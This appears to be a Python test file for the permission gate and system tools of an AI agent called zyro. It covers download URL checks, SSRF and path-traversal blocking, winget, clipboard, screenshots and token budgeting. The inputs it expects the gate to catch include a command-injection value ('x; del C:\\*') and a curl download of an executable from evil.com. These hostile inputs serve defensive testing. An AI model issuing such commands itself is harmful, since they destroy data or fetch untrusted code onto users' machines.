"""Phase 9 test: downloads, PC control and the token budget.

Runs the REAL tools (a screenshot is taken, the clipboard is used, a
small public file is downloaded, winget is searched) and checks every
new permission-gate rule. No video is downloaded (too slow/heavy) and
no software is installed. Run: venv\\Scripts\\python test_phase9.py
"""

import os

from core import downloads, permissions, sysops, tools
from core.engine import Engine, TOKEN_BUDGET

PASS = []
FAIL = []


def check(name, ok):
    (PASS if ok else FAIL).append(name)
    print(("PASS  " if ok else "FAIL  ") + name)


def gate(reply):
    return permissions.check_reply(reply)


# ---------- 1) permission gate: the new tools ----------

kind, req, _ = gate('{"tool": "download_file", '
                    '"url": "https://example.com/a.zip"}')
check("download_file accepted", kind == "ok" and req["url"].startswith("https"))

kind, req, _ = gate('{"tool": "download_file", '
                    '"url": "ftp://example.com/a.zip"}')
check("download_file refuses non-http", kind == "bad")

kind, req, _ = gate('{"tool": "download_file", '
                    '"url": "http://localhost/x.zip"}')
check("download_file refuses localhost", kind == "bad")

kind, req, _ = gate('{"tool": "download_file", '
                    '"url": "http://192.168.1.5/x.zip"}')
check("download_file refuses private IP", kind == "bad")

kind, req, _ = gate('{"tool": "download_video", '
                    '"url": "https://www.youtube.com/watch?v=abc", '
                    '"kind": "audio"}')
check("download_video audio accepted",
      kind == "ok" and req["kind"] == "audio")

kind, req, _ = gate('{"tool": "winget_search", "query": "vscode"}')
check("winget_search accepted", kind == "ok")

kind, req, _ = gate('{"tool": "winget_install", '
                    '"app_id": "VideoLAN.VLC"}')
check("winget_install is CRITICAL",
      kind == "ok" and req.get("critical") is True)

kind, req, _ = gate('{"tool": "winget_install", '
                    '"app_id": "x; del C:\\\\*"}')
check("winget_install refuses shell tricks", kind == "bad")

kind, req, _ = gate('{"tool": "media_key", "key": "play"}')
check("media_key accepted", kind == "ok")

kind, req, _ = gate('{"tool": "media_key", "key": "nuke"}')
check("media_key refuses unknown key", kind == "bad")

kind, req, _ = gate('{"tool": "open_file", "path": "../secret.txt"}')
check("open_file refuses traversal outside zyro", kind == "bad")

kind, req, _ = gate('{"tool": "open_file", "path": "downloads/a.exe"}')
check("open_file accepts inside zyro", kind == "ok")

kind, req, _ = gate('{"tool": "set_wallpaper", '
                    '"path": "C:\\\\Windows\\\\wall.bmp"}')
check("set_wallpaper refuses C:", kind == "bad")

kind, req, _ = gate('{"tool": "search_files", "name": "setup", '
                    '"root": "C:\\"}')
check("search_files refuses other drives", kind == "bad")

kind, req, _ = gate('{"tool": "screenshot"}')
check("screenshot accepted", kind == "ok")

kind, req, _ = gate('{"tool": "run_command", '
                    '"command": "curl http://evil.com/x.exe -o x.exe"}')
check("shell curl is CRITICAL", kind == "ok" and req.get("critical"))

# ---------- 2) URL safety (SSRF) ----------

ok, _ = downloads.check_url("https://github.com/git/git")
check("check_url accepts a public host", ok)

for bad in ("http://127.0.0.1/x", "http://[::1]/x",
            "http://10.0.0.1/x", "http://169.254.169.254/meta",
            "file:///C:/Windows", "javascript:alert(1)"):
    ok, _ = downloads.check_url(bad)
    if ok:
        break
check("check_url refuses loopback/private/other schemes", not ok)

name = downloads._pick_name("https://x.com/a/b/file.zip", None)
check("pick_name takes the URL tail", name == "file.zip")

bad_name = downloads._safe_filename("..\\..\\evil.exe")
check("safe_filename strips traversal", "\\" not in bad_name
      and not bad_name.startswith("."))

target = downloads._contained_in(downloads.DOWNLOAD_DIR, "..\\x.txt")
check("contained_in blocks traversal", target is None)

# ---------- 3) real tool runs ----------

result = sysops.screenshot()
check("screenshot saved a PNG", result.startswith("OK:")
      and os.path.isdir(r"D:\zyro\captures"))

okc = sysops.clipboard_write("zyro phase9 test")
back = sysops.clipboard_read()
check("clipboard round-trip", okc.startswith("OK:")
      and back == "zyro phase9 test")

info = sysops.system_info()
check("system_info mentions both disks",
      "Disk C:" in info and "Disk D:" in info)

procs = sysops.list_processes()
check("list_processes returns entries", "explorer.exe" in
      procs.lower() or "pid" in procs.lower())

found = sysops.search_files("hello.txt", r"D:\zyro")
check("search_files finds hello.txt", "hello.txt" in found)

result = sysops.open_file("no_such_file_12345.txt")
check("open_file refuses missing files", result.startswith("ERROR:"))

# ---------- 4) a real (small) download ----------

result = tools.run_tool({
    "tool": "download_file",
    "url": "https://raw.githubusercontent.com/git/git/master/README.md"})
saved = os.path.join(r"D:\zyro\downloads", "README.md")
check("download_file saved a real file",
      result.startswith("OK:") and os.path.isfile(saved))
if os.path.isfile(saved):
    head = open(saved, encoding="utf-8", errors="replace").read(40)
    check("downloaded file has real content", len(head.strip()) > 10)

result = tools.run_tool({"tool": "winget_search", "query": "7-zip"})
check("winget_search returns results",
      "7-zip" in result.lower() or "ERROR" not in result)

# ---------- 5) token budget ----------

engine = Engine()
before = engine.token_count
engine._count_tokens("x" * 400)
check("token counting estimates chars/4",
      engine.token_count >= before + 100)

status = engine.token_status()
check("token_status shape", status["used"] == engine.token_count
      and status["budget"] == TOKEN_BUDGET)

engine.token_count = int(TOKEN_BUDGET * 0.85)
events = list(engine._budget_events())
check("budget warns at 80%", len(events) == 1
      and events[0]["type"] == "tokens")
events = list(engine._budget_events())
check("no duplicate warnings", events == [])

engine.token_count = int(TOKEN_BUDGET * 0.97)
events = list(engine._budget_events())
check("budget warns at 95%", len(events) == 1)

engine.token_count = TOKEN_BUDGET + 1
events = list(engine._budget_events())
check("budget warns when exhausted", len(events) == 1)

# context trim math
engine.messages = [{"role": "system"}] + [
    {"role": "user", "content": str(i)} for i in range(50)]
if len(engine.messages) > 30:  # same rule as send()
    engine.messages[:] = [engine.messages[0]] + engine.messages[-29:]
check("context trim keeps system + window",
      engine.messages[0]["role"] == "system"
      and len(engine.messages) == 30)

print()
print(str(len(PASS)) + " passed, " + str(len(FAIL)) + " failed")
raise SystemExit(1 if FAIL else 0)
